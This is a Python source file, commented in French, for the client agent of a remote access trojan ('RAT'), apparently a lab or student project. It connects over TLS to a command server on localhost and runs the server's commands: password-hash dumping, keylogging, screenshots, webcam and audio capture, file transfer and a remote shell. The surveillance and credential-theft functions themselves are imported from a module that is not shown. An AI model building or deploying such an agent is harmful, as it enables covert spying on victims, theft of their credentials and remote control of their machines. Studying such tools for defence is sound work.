"""
Client RAT (agent) - Remote Administration Tool.

Se connecte au serveur via une socket TCP chiffrée TLS.
Exécute les commandes reçues et renvoie les résultats.
Compatible Windows et Linux.
"""

import platform
import socket

from rat_project.common.protocol import decode_message, encode_message
from rat_project.common.tls import create_client_ssl_context
from rat_project.utils.logger_config import setup_logger

HOST = "127.0.0.1"
PORT = 8888

logger = setup_logger("client")


# ---------------------------------------------------------------------------
# Enregistrement
# ---------------------------------------------------------------------------


def build_registration_payload() -> dict[str, str]:
    """
    Construit le message d'enregistrement envoyé au serveur à la connexion.

    Returns:
        dict: Payload avec hostname, OS et version.
    """
    return {
        "type": "register",
        "hostname": socket.gethostname(),
        "os": platform.system(),
        "release": platform.release(),
    }


# ---------------------------------------------------------------------------
# Dispatch des commandes
# ---------------------------------------------------------------------------


def handle_server_command(message: dict, conn: socket.socket) -> dict | None:
    """
    Route une commande reçue du serveur vers la fonction appropriée.

    Les commandes shell, download et upload gèrent leur propre
    communication avec le serveur et retournent None.

    Args:
        message: Message décodé reçu du serveur.
        conn: Socket TLS pour les commandes avec échanges multiples.

    Returns:
        dict de réponse à envoyer au serveur, ou None si déjà géré.
    """
    from rat_project.client import client_actions_os as actions

    command = message.get("command")
    logger.info("Commande reçue : %s", command)

    if command == "sysinfo":
        return {"type": "command_result", "command": "sysinfo", "output": actions.get_system_info()}

    elif command == "ipconfig":
        return {"type": "command_result", "command": "ipconfig", "output": actions.get_ipconfig()}

    elif command == "screenshot":
        data = actions.take_screenshot()
        return {"type": "command_result", "command": "screenshot", "data": data, "output": "Screenshot pris."}

    elif command == "search":
        filename = message.get("filename", "")
        return {"type": "command_result", "command": "search", "output": actions.search_file(filename)}

    elif command == "hashdump":
        return {"type": "command_result", "command": "hashdump", "output": actions.hashdump()}

    elif command == "keylogger":
        return {"type": "command_result", "command": "keylogger", "output": actions.toggle_keylogger()}

    elif command == "webcam_snapshot":
        data = actions.webcam_snapshot()
        return {
            "type": "command_result",
            "command": "webcam_snapshot",
            "data": data,
            "output": "Snapshot webcam pris.",
        }

    elif command == "webcam_stream":
        actions.webcam_stream(conn)
        return None

    elif command == "record_audio":
        data = actions.record_audio()
        return {
            "type": "command_result",
            "command": "record_audio",
            "data": data,
            "output": "Audio enregistré.",
        }

    elif command == "download":
        path = message.get("path", "")
        return actions.handle_download(path)

    elif command == "upload":
        return actions.handle_upload(message)

    elif command == "shell_start":
        actions.handle_shell(conn)
        return None

    else:
        logger.warning("Commande inconnue : %s", command)
        return {"type": "command_result", "command": command or "unknown", "output": "Commande inconnue."}


# ---------------------------------------------------------------------------
# Boucle principale du client
# ---------------------------------------------------------------------------


def run_client() -> None:
    """
    Point d'entrée du client RAT.

    Se connecte au serveur en TLS, envoie le message d'enregistrement,
    puis attend et exécute les commandes en boucle.
    """
    ssl_context = create_client_ssl_context()

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as raw_socket:
            with ssl_context.wrap_socket(raw_socket, server_hostname=HOST) as client_socket:
                client_socket.connect((HOST, PORT))
                logger.info("Connecté au serveur %s:%s (TLS)", HOST, PORT)

                # Enregistrement
                payload = build_registration_payload()
                client_socket.sendall(encode_message(payload))
                logger.info("Enregistrement envoyé : %s", payload)

                # Accusé de réception
                data = client_socket.recv(4096)
                ack = decode_message(data.decode("utf-8").strip())
                logger.info("ACK reçu : %s", ack)

                # Boucle principale
                while True:
                    data = client_socket.recv(65536)

                    if not data:
                        logger.info("Serveur déconnecté.")
                        break

                    server_message = decode_message(data.decode("utf-8").strip())
                    logger.info("Message reçu : %s", server_message)

                    response = handle_server_command(server_message, client_socket)

                    if response is not None:
                        client_socket.sendall(encode_message(response))
                        logger.info("Réponse envoyée pour : %s", response.get("command"))

    except Exception as exc:
        logger.exception("Erreur client : %s", exc)


if __name__ == "__main__":
    run_client()
